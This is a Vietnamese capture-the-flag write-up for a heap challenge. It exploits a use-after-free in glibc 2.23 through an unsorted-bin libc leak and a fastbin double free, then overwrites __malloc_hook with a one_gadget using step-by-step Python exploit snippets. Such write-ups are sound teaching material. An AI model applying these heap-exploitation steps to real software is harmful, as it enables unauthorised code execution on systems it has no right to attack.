# HEAP 2
## Source

<details> <summary> IDA </summary>

```c
__int64 createHeap()
{
  unsigned int Int; // [rsp+8h] [rbp-8h]
  unsigned int size; // [rsp+Ch] [rbp-4h]

  printf("Index:");
  Int = readInt();
  if ( Int >= 0xA )
    exit(0);
  printf("Input size:");
  size = readInt();
  if ( size > 0x1000 )
    exit(0);
  store[Int] = malloc(size);
  storeSize[Int] = size;
  printf("Input data:");
  readStr((void *)store[Int], size);
  puts("Done");
  return 0LL;
}

__int64 showHeap()
{
  unsigned int Int; // [rsp+Ch] [rbp-4h]

  printf("Index:");
  Int = readInt();
  if ( Int >= 0xA )
    exit(0);
  if ( store[Int] )
    printf("Data = %s\n", (const char *)store[Int]);
  return 0LL;
}

__int64 deleteHeap()
{
  unsigned int Int; // [rsp+Ch] [rbp-4h]

  printf("Input index:");
  Int = readInt();
  if ( Int >= 10 )
    exit(0);
  if ( store[Int] )
  {
    free((void *)store[Int]);
    puts("Done ");
  }
  return 0LL;
}

__int64 editHeap()
{
  unsigned int Int; // [rsp+Ch] [rbp-4h]

  printf("Input index:");
  Int = readInt();
  if ( Int >= 0xA )
    exit(0);
  if ( store[Int] )
  {
    readStr((void *)store[Int], storeSize[Int]);
    puts("Done ");
  }
  return 0LL;
}

__int64 menu()
{
  puts("1: create heap");
  puts("2: shop heap");
  puts("3: edit heap");
  puts("4: delete heap");
  puts("5: exit");
  puts(">");
  return 0LL;
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  initState(argc, argv, envp);
  puts("Ez heap challange !");
  while ( 1 )
  {
    menu();
    switch ( (unsigned int)readInt() )
    {
      case 1u:
        createHeap();
        break;
      case 2u:
        showHeap();
        break;
      case 3u:
        editHeap();
        break;
      case 4u:
        deleteHeap();
        break;
      case 5u:
        exit(0);
      default:
        puts("no option");
        break;
    }
  }
}

```

</details>

## Ý tưởng
- Đầu tiên ta nhắc lại lí thuyết về libc.2.23. Cơ chế fastbin là dslk đơn, lưu từ 0x20 - 0x80, chunk khi được free sẽ có cơ chế sau:
    - Nếu chunk được free có size (ví dụ 0x30), mà trong fastbin chưa có chunk nào được lưu (ở 0x30) thì 8 byte đầu tiên (sau header chunk) sẽ là 0x0
    - Nếu đã có chunk trước đó được lưu (ở 0x30), thì chunk thứ 2 được free (vào 0x30) sẽ là địa chỉ chunk trước đó (tính từ header chunk 1)
- Khi chunk trong fastbin được malloc ra, nó sẽ trỏ đến địa chỉ mà chunk trong fastbin đang chứa
- Từ các lí thuyết trên ta thấy, nếu có UAF, thay đổi địa chỉ mà chunk đang trỏ, ta có thể ghi đè các giá trị khác.
- Một lí thuyết khá hữu ích nữa là nếu cần leak libc, ta có thể free 2 chunk A, B vào Unsorted bin và in chunk A (chunk A giữ 1 địa chỉ của rwsection trong libc)
- Quay trở lại bài này, ta có thể thấy lỗ hổng chương trình nằm ở việc khi `create heap`, địa chỉ chunk được lưu vào một mảng global `store[Int] = malloc(size);`, tuy nhiên khi `delete heap`, các chunk được free không hề bị xoá địa chỉ ở `store`, điều đó dẫn đến lỗi UAF trong option `edit heap`

## Khai thác
### Leak libc
- Ban đầu mình tính dùng `show heap` với các giá trị âm để có thể leak các dữ liệu mình muốn, tuy nhiên mình không thể vì `unsigned int Int;` khi nhập số âm ở kiểu int (hàm atoi()) nhưng qua bên `Int` là kiểu unsigned int thì nó trở thành số dương và lớn hơn `0xa` nên chương trình exit luôn
```c
  unsigned int Int; // [rsp+Ch] [rbp-4h]

  printf("Index:");
  Int = readInt();
```
- Vậy bây giờ, ta thử leak libc bằng unsorted bin.
- Ta sẽ tạo 2 chunk A, B sau đó free chunk A đi. Tại sao free chunk A mà không free chunk B đi nhỉ?
- Mình đã thử free chunk B đi xem kết quả ntn, kết quả khi free chunk B đi
  ![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/d7992b8b-3c55-456a-84b7-3187c55374b1)
  ![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/f254e7b8-505d-495e-97dc-c306c77e7bbe)
- Thử tạo 3 chunk và free chunk giữa xem, nếu free chunk giữa mà có địa chỉ libc ở bên trong chunk thì có thể do top chunk "giữ hộ" chunk cạnh top chunk
  ![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/d02dd216-0a4c-441b-9a74-acf098a78084)
- Chính xác là top chunk có thể đã gộp chunk được free cạnh nó.
- Vậy quay lại chủ đề là chúng ta sẽ dùng 2 chunk A, B sau đó free chunk A
```python
create(b"0", b"130", b"A"*130)
create(b"1", b"130", b"B"*130)

delete(b"0")
show(b"0")
p.recvuntil(b"Data = ")
libc_leak = u64(p.recv(6) + b"\0\0")
info("libc leak: " + hex(libc_leak))
libc.address = libc_leak - 0x39bb78
info("libc base: " + hex(libc.address))
```

### DBF
- Ta tiến hành DBF (lưu ý size)
```python
create(b"2", b"96", b"a"*96)
create(b"3", b"96", b"a"*96)
delete(b"2")
delete(b"3")
delete(b"2")
```
> mục đích DBF vì ta có thể điều khiển chương trình, có được con trỏ để thay đổi chương trình

- Khi này trong danh sách fastbin sẽ như sau
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/a3344e2f-7fec-4e52-991d-5ad349389780)
- Các số cũng là thứ tự khi được lấy ra
- Bây giờ ta có thể thay đổi dữ liệu của chunk 3 (hình trên) thông qua chunk 1, để nó trỏ đến một vùng nhớ khác.
- Giả sử sau khi DBF, mình gọi lại chunk thứ nhất trong fastbin ra
```python
create(b"4", b"96", b"a" * 8)
```
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/66282eec-529b-4ddc-8e30-a72c8d95374f)
> có lẽ vùng địa chỉ mới không hợp lệ nên nó không hiện ra
- Ta thử một vùng rw section trong libc
```python
create(b"4", b"96", b"a" * 8)
edit(b"4", p64(libc.address + 0x5c5e40))
```
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/f68fd31a-f87e-4827-99df-70e9ed5f0be0)
- Ta đã tạo một fake chunk mới
- Tuy nhiên để malloc được thì nó sẽ kiểm tra `size != 0` và `chunk & 0xf != 0`, và mục tiêu của chúng ta là ghi đè `__malloc_hook`
- Để có thể set size của fake chunk thì ta sẽ tìm các địa chỉ trên `__malloc_hook` 
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/e52329b2-26e3-47a0-967e-f22dee7c99ff)
- Thì như ta đã biết, header heap có 0x10 byte, trong đó 0x8 byte sẽ là size của chunk, nên ta có thể lợi dụng vùng nhớ này để set size cho fake chunk size
- Và khi malloc ra nó cũng sẽ kiểm tra size của chunk đó có phù hợp không, nghĩa là nếu trong danh sách fastbin 0x60 nhưng lại có 1 chunk 0x80 hoặc không nằm trong vùng 0x60 - 0x6f thì sẽ lỗi ngay, do đó ngay chỗ DBF phía trên sẽ phải tạo và free các chunk có cùng size với size fake chunk này.
- Do đó khi ở chỗ khai thác DBF, mình lấy 0x60 (96) byte để khi làm tròn nó sẽ là 0x70 byte, free đi thì nó ở fastbin 0x70
```python
create(b"4", b"96", p64(libc.sym['__malloc_hook'] - 35))
```
- Vầ bây giờ ta sẽ lấy chunk thứ 4 (hình trên) trong fastbin ra để ghi đè `__malloc_hook`, và ghi đè one_gadget vào
- Sở dĩ vì sao có 19 byte a là vì khi nãy ta tạo fake chunk ở -35, khi malloc thì nó sẽ lấy 16 byte làm header, vậy còn 19 byte còn lại mới bắt đầu ghi đè `__malloc_hook`
```python
create(b"5", b"96", b"C"*0x8)
create(b"6", b"96", b"D"*8)
one_gadget = libc.address + 0xd5bf7
create(b"6", b"96", b"1"* 19 + p64(one_gadget))
```
- Sau khi ta lấy fake chunk ra thì bây giờ ta tạo lỗi DBF để khi chương trình check, nó sẽ gọi `one_gadget`

```python
delete(b"5")
delete(b"5")
```

## Kết quả
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/2d71f6ed-a03a-4d51-ba54-184b917e7eab)
